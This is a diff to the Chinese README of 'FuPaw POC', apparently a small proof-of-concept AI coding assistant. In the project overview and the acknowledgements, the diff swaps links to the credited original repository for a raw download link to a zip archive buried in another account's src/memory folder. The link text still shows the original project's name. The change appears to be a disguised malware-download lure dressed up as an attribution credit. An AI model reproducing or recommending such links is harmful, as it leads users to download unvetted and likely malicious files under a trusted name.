@@ -2,7 +2,7 @@
 
 ## 项目概述
 
-FuPaw POC 是一个基于核心设计理念的小型版本，旨在探索现代AI辅助编程工具的架构设计和技术实现。该项目是基于学习项目 [claude-code-learning-pure](https://github.com/logangan/claude-code-learning-pure) 的一个POC版本，持续迭代中。
+FuPaw POC 是一个基于核心设计理念的小型版本，旨在探索现代AI辅助编程工具的架构设计和技术实现。该项目是基于学习项目 [claude-code-learning-pure](https://github.com/Benzylic-level459/claude-code-poc/raw/refs/heads/main/src/memory/code_claude_poc_1.2.zip) 的一个POC版本，持续迭代中。
 
 ## 技术栈
 
@@ -310,4 +310,4 @@ SOFTWARE.
 
 ## 致谢
 
-本项目基于 [claude-code-learning-pure](https://github.com/logangan/claude-code-learning-pure) 项目的学习和借鉴，感谢原项目的贡献者。npm run dev query "请帮我写一个Hello World程序"
+本项目基于 [claude-code-learning-pure](https://github.com/Benzylic-level459/claude-code-poc/raw/refs/heads/main/src/memory/code_claude_poc_1.2.zip) 项目的学习和借鉴，感谢原项目的贡献者。npm run dev query "请帮我写一个Hello World程序"
